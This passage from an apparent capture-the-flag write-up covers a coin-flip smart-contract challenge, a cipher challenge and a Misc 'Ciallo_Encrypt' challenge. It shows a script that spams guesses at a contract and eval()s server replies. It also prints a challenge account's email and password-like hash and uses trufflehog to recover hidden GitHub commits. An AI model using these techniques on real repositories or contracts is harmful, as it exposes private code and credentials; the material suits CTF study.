+</span></span><span class=line><span class=cl>        <span class=s2>&#34;version&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;funcName&#34;</span><span class=p>:</span> <span class=s2>&#34;consecutiveWins&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;funcParam&#34;</span><span class=p>:</span> <span class=p>[],</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;contractAddress&#34;</span><span class=p>:</span> <span class=s2>&#34;0x27f714e5ac1370580776803bae02dd2fb6ddb8f6&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;contractAbi&#34;</span><span class=p>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;constant&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;inputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;_guess&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;bool&#34;</span><span class=p>}],</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;flip&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;outputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;bool&#34;</span><span class=p>},</span> <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;string&#34;</span><span class=p>}],</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;payable&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;stateMutability&#34;</span><span class=p>:</span> <span class=s2>&#34;nonpayable&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;function&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>},</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;constant&#34;</span><span class=p>:</span> <span class=kc>True</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;inputs&#34;</span><span class=p>:</span> <span class=p>[],</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;consecutiveWins&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;outputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;uint256&#34;</span><span class=p>}],</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;payable&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;stateMutability&#34;</span><span class=p>:</span> <span class=s2>&#34;view&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;function&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>},</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;constant&#34;</span><span class=p>:</span> <span class=kc>True</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;inputs&#34;</span><span class=p>:</span> <span class=p>[],</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;verify&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;outputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;address&#34;</span><span class=p>},</span> <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;uint256&#34;</span><span class=p>},</span>
+</span></span><span class=line><span class=cl>                            <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;string&#34;</span><span class=p>}],</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;payable&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;stateMutability&#34;</span><span class=p>:</span> <span class=s2>&#34;view&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;function&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>},</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;inputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;_key&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;string&#34;</span><span class=p>}],</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;payable&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;stateMutability&#34;</span><span class=p>:</span> <span class=s2>&#34;nonpayable&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;constructor&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>},</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;anonymous&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;inputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;indexed&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span> <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;address&#34;</span><span class=p>},</span>
+</span></span><span class=line><span class=cl>                           <span class=p>{</span><span class=s2>&#34;indexed&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span> <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;uint256&#34;</span><span class=p>}],</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;ConsecutiveWins&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;event&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>data</span><span class=p>),</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>_</span><span class=p>,</span> <span class=n>n</span> <span class=o>=</span> <span class=n>get_num</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=n>n</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=nb>eval</span><span class=p>(</span><span class=n>n</span><span class=p>)[</span><span class=mi>0</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>n</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>n</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>n</span><span class=p>,</span> <span class=n>end</span><span class=o>=</span><span class=s2>&#34; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>n</span> <span class=o>==</span> <span class=mi>10</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span>
+</span></span><span class=line><span class=cl>        <span class=n>send_guess</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>([</span><span class=kc>True</span><span class=p>,</span> <span class=kc>False</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>sleep</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://su-team.cn/img/2025-QWNT/37.png alt=img></p><p>拿到密文是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>buiqhrvilHwigdClBuiTucduZnXmrLoHleieggbawsgsgcAyaFekhqWmAvqTocwhBuiiARfyurergyhNprwePcHcurmQsmGmqopirdhliaWpdRwIvhRphqgNproiBgGevBaRwfsyifiAlRvQpvglwfsemLQeBzswpnrkhbwmiAsXkcFjWvrXlLtuDbVsiRvyiqStWgcHwsxlLqqilrfCwfCmmqiWlPwhogSxuybMuvXmPncLbnrxPcGmitiWzgHbWhxXkcgfQtlxhQhxiakiUmtNprmvPcGmitiWecWhoeiegzMjWymxlaofwefyVgbyaFvmYyzmmGg
+</span></span></code></pre></td></tr></table></div></div><p>用在线网站爆破密钥</p><p><img src=https://su-team.cn/img/2025-QWNT/38.png alt=img></p><blockquote><p>flag{ineedyou}</p></blockquote><h1 id=misc>Misc</h1><h2 id=ciallo_encrypt>Ciallo_Encrypt</h2><p>日志中base64解码恢复内容</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>5qC45b+D5Luj56CB5oiR5bey5bCG5YW25pS+6L+b5LqGZm9ya+eahOengeS6uuS7k+W6k+mHjA<span class=o>==</span>
+</span></span><span class=line><span class=cl>核心代码我已将其放进了fork的私人仓库里
+</span></span></code></pre></td></tr></table></div></div><p>去github上查找对应的项目，给出了app的基本代码，去commit发现账户对应的用户和密码要求</p><p><img src=https://su-team.cn/img/2025-QWNT/39.png alt=img></p><p>在issue里提到了qq，简单处理得到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>3517508570@qq.com
+</span></span><span class=line><span class=cl>f42e16b836b22e83fd3818b603c75dc6
+</span></span></code></pre></td></tr></table></div></div><p>进去发现有个历史存档的信息，需要尝试解密，根据一开始的提示，需要爆破一下隐藏的commit拿到加密的代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>EXPORT <span class=nv>GITHUB_TOKEN</span><span class=o>=</span>ghp_Jk...
+</span></span><span class=line><span class=cl>./trufflehog github-experimental --repo https://github.com/Yu2ul0ver/Ciallo_Encrypt0r.git --object-discovery
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://su-team.cn/img/2025-QWNT/40.png alt=img></p><p>随机访问一个拿到加密逻辑</p><p><img src=https://su-team.cn/img/2025-QWNT/41.png alt=img></p><p>带上密文和时间戳给ai写解密脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.Padding</span> <span class=kn>import</span> <span class=n>unpad</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ciallo_decrypt</span><span class=p>(</span><span class=n>encoded_text</span><span class=p>,</span> <span class=n>timestamp</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;时间戳: </span><span class=si>{</span><span class=n>timestamp</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>patterns</span> <span class=o>=</span> <span class=n>encoded_text</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>pattern</span> <span class=ow>in</span> <span class=n>patterns</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>pattern</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1># 基准模板: Ciallo～(∠・ω&lt;)⌒★</span>
+</span></span><span class=line><span class=cl>        <span class=n>bits</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;0&#39;</span><span class=p>]</span> <span class=o>*</span> <span class=mi>8</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1># bit[0]: pattern[1]==&#39;1&#39; -&gt; 1</span>
+</span></span><span class=line><span class=cl>        <span class=n>bits</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;1&#39;</span> <span class=k>if</span> <span class=n>pattern</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;1&#39;</span> <span class=k>else</span> <span class=s1>&#39;0&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1># bit[1]: pattern[2]==&#39;@&#39; -&gt; 0, 否则 1</span>
+</span></span><span class=line><span class=cl>        <span class=n>bits</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;0&#39;</span> <span class=k>if</span> <span class=n>pattern</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;@&#39;</span> <span class=k>else</span> <span class=s1>&#39;1&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1># bit[2]: pattern[3]==&#39;1&#39; -&gt; 1</span>
+</span></span><span class=line><span class=cl>        <span class=n>bits</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;1&#39;</span> <span class=k>if</span> <span class=n>pattern</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;1&#39;</span> <span class=k>else</span> <span class=s1>&#39;0&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1># bit[3]: pattern[4]==&#39;1&#39; -&gt; 1</span>
+</span></span><span class=line><span class=cl>        <span class=n>bits</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;1&#39;</span> <span class=k>if</span> <span class=n>pattern</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;1&#39;</span> <span class=k>else</span> <span class=s1>&#39;0&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1># bit[4]: pattern[5]==&#39;0&#39; -&gt; 0, 否则 1</span>
+</span></span><span class=line><span class=cl>        <span class=n>bits</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;0&#39;</span> <span class=k>if</span> <span class=n>pattern</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;0&#39;</span> <span class=k>else</span> <span class=s1>&#39;1&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1># bit[5]: pattern[6]==&#39;一&#39; -&gt; 1</span>
+</span></span><span class=line><span class=cl>        <span class=n>bits</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;1&#39;</span> <span class=k>if</span> <span class=n>pattern</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;一&#39;</span> <span class=k>else</span> <span class=s1>&#39;0&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1># bit[6:8]: 根据位置 8,9,10 判断</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>pattern</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;°&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>bits</span><span class=p>[</span><span class=mi>6</span><span class=p>],</span> <span class=n>bits</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;0&#39;</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>pattern</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;2&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>bits</span><span class=p>[</span><span class=mi>6</span><span class=p>],</span> <span class=n>bits</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;1&#39;</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>pattern</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;w&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>bits</span><span class=p>[</span><span class=mi>6</span><span class=p>],</span> <span class=n>bits</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;1&#39;</span><span class=p>,</span> <span class=s1>&#39;1&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>bits</span><span class=p>[</span><span class=mi>6</span><span class=p>],</span> <span class=n>bits</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;0&#39;</span><span class=p>,</span> <span class=s1>&#39;1&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>binary</span> <span class=o>+=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>bits</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;二进制长度: </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># 第二步：二进制 -&gt; UTF-8 字节</span>
+</span></span><span class=line><span class=cl>    <span class=n>utf8_bytes</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>binary</span><span class=p>),</span> <span class=mi>8</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>byte_str</span> <span class=o>=</span> <span class=n>binary</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span> <span class=o>+</span> <span class=mi>8</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>byte_str</span><span class=p>)</span> <span class=o>==</span> <span class=mi>8</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>utf8_bytes</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>byte_str</span><span class=p>,</span> <span class=mi>2</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># 第三步：UTF-8 解码 -&gt; Base64</span>
+</span></span><span class=line><span class=cl>    <span class=n>base64_str</span> <span class=o>=</span> <span class=n>utf8_bytes</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Base64: </span><span class=si>{</span><span class=n>base64_str</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># 第四步：Base64 解码 -&gt; AES 密文</span>
+</span></span><span class=line><span class=cl>    <span class=n>ciphertext</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>base64_str</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;AES 密文长度: </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span><span class=si>}</span><span class=s2> 字节&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># 第五步：生成密钥并 AES-ECB 解密</span>
+</span></span><span class=line><span class=cl>    <span class=n>ts_str</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>timestamp</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>ts_str</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;密钥 (MD5 of &#39;</span><span class=si>{</span><span class=n>ts_str</span><span class=si>}</span><span class=s2>&#39;): </span><span class=si>{</span><span class=n>key</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>plaintext_padded</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>plaintext</span> <span class=o>=</span> <span class=n>unpad</span><span class=p>(</span><span class=n>plaintext_padded</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>block_size</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>plaintext</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 密文</span>
